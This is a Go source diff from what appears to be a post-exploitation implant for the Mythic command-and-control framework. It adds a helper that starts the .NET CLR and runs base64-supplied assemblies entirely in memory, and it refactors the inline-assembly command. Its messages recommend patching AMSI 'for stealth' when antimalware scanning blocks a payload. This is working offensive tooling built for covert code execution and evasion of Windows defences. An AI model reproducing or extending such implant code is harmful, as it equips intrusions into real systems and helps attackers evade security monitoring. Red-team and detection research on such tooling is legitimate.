@@ -49,6 +49,98 @@ var (
 	amsiPatched   bool // tracks whether AMSI was patched via start-clr
 )
 
+// ExecuteNETAssembly is a shared helper that executes a .NET assembly in memory
+// using the CLR hosting infrastructure. Called by both inline-assembly and execute-memory.
+// Returns (output, error). Thread-safe via assemblyMutex.
+func ExecuteNETAssembly(assemblyBytes []byte, args []string) (string, error) {
+	var sb strings.Builder
+
+	// Ensure CLR is started
+	assemblyMutex.Lock()
+	if !clrStarted {
+		sb.WriteString("[*] Auto-starting CLR v4...\n")
+
+		clr.RedirectStdoutStderr()
+
+		var loadErr error
+		for attempt := 1; attempt <= 3; attempt++ {
+			runtimeHost, loadErr = clr.LoadCLR("v4")
+			if loadErr == nil {
+				break
+			}
+			if strings.Contains(loadErr.Error(), "cannot find the file") {
+				jitterSleep(300*time.Millisecond, 700*time.Millisecond)
+				continue
+			}
+			break
+		}
+		if loadErr != nil {
+			assemblyMutex.Unlock()
+			return "", fmt.Errorf("CLR initialization failed: %v", loadErr)
+		}
+		clrStarted = true
+		sb.WriteString("[+] CLR started\n")
+		sb.WriteString("[!] WARNING: AMSI not patched — run 'start-clr' with Autopatch for stealth\n")
+	}
+	assemblyMutex.Unlock()
+
+	// Load assembly
+	assemblyMutex.Lock()
+	var methodInfo *clr.MethodInfo
+	var loadErr error
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				loadErr = fmt.Errorf("PANIC during LoadAssembly: %v", r)
+			}
+		}()
+		methodInfo, loadErr = clr.LoadAssembly(runtimeHost, assemblyBytes)
+	}()
+	assemblyMutex.Unlock()
+
+	if loadErr != nil {
+		errMsg := fmt.Sprintf("Load error: %v", loadErr)
+		if strings.Contains(loadErr.Error(), "0x8007000b") && !amsiPatched {
+			errMsg += " (AMSI likely blocked — run 'start-clr' with Autopatch first)"
+		}
+		return "", fmt.Errorf("%s", errMsg)
+	}
+
+	// Invoke assembly
+	assemblyMutex.Lock()
+	var stdout, stderr string
+	var invokeErr error
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %v", r)
+			}
+		}()
+		stdout, stderr = clr.InvokeAssembly(methodInfo, args)
+	}()
+	assemblyMutex.Unlock()
+
+	if invokeErr != nil {
+		return sb.String(), fmt.Errorf("Invoke error: %v", invokeErr)
+	}
+
+	if stdout != "" {
+		sb.WriteString(stdout)
+		if !strings.HasSuffix(stdout, "\n") {
+			sb.WriteString("\n")
+		}
+	}
+	if stderr != "" && !strings.Contains(stderr, "The system cannot find the file specified") {
+		sb.WriteString("[stderr] ")
+		sb.WriteString(stderr)
+		if !strings.HasSuffix(stderr, "\n") {
+			sb.WriteString("\n")
+		}
+	}
+
+	return sb.String(), nil
+}
+
 // InlineAssemblyCommand implements the inline-assembly command
 type InlineAssemblyCommand struct{}
 
@@ -59,7 +151,7 @@ func (c *InlineAssemblyCommand) Name() string {
 
 // Description returns the command description
 func (c *InlineAssemblyCommand) Description() string {
-	return "Execute a .NET assembly in memory from Mythic file storage"
+	return "Execute a .NET assembly in memory from uploaded file storage"
 }
 
 // InlineAssemblyParams represents the parameters for inline-assembly
@@ -72,49 +164,29 @@ type InlineAssemblyParams struct {
 func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult {
 	// Ensure we're on Windows
 	if runtime.GOOS != "windows" {
-		return structs.CommandResult{
-			Output:    "Error: This command is only supported on Windows",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: This command is only supported on Windows")
 	}
 
 	// Parse parameters
 	var params InlineAssemblyParams
 	err := json.Unmarshal([]byte(task.Params), &params)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	// Validate assembly_b64
 	if params.AssemblyB64 == "" {
-		return structs.CommandResult{
-			Output:    "Error: No assembly data provided",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: No assembly data provided")
 	}
 
 	// Decode the base64-encoded assembly
 	assemblyBytes, err := base64.StdEncoding.DecodeString(params.AssemblyB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding assembly: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding assembly: %v", err)
 	}
 
 	if len(assemblyBytes) == 0 {
-		return structs.CommandResult{
-			Output:    "Error: Assembly data is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: Assembly data is empty")
 	}
 
 	// Parse arguments string into array
@@ -153,7 +225,7 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 			}
 			if strings.Contains(loadErr.Error(), "cannot find the file") {
 				output.WriteString(fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt))
-				time.Sleep(500 * time.Millisecond)
+				jitterSleep(300*time.Millisecond, 700*time.Millisecond)
 				continue
 			}
 			break
@@ -161,11 +233,7 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		if loadErr != nil {
 			assemblyMutex.Unlock()
 			output.WriteString(fmt.Sprintf("[!] Error loading CLR: %v\n", loadErr))
-			return structs.CommandResult{
-				Output:    output.String(),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorResult(output.String())
 		}
 		clrStarted = true
 		output.WriteString("[+] CLR started successfully\n")
@@ -221,11 +289,7 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		output.WriteString("  - Verify the assembly is not corrupted\n")
 		output.WriteString(fmt.Sprintf("  - Assembly size: %d bytes\n", len(assemblyBytes)))
 
-		return structs.CommandResult{
-			Output:    output.String(),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output.String())
 	}
 
 	output.WriteString("[+] Assembly loaded successfully\n")
@@ -257,11 +321,7 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		output.WriteString("  - Verify no external dependencies are required\n")
 		output.WriteString("  - Try running the assembly at command line first\n")
 
-		return structs.CommandResult{
-			Output:    output.String(),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output.String())
 	}
 
 	output.WriteString("[+] Assembly executed successfully\n")
@@ -284,9 +344,5 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		}
 	}
 
-	return structs.CommandResult{
-		Output:    output.String(),
-		Status:    "completed",
-		Completed: true,
-	}
+	return successResult(output.String())
 }
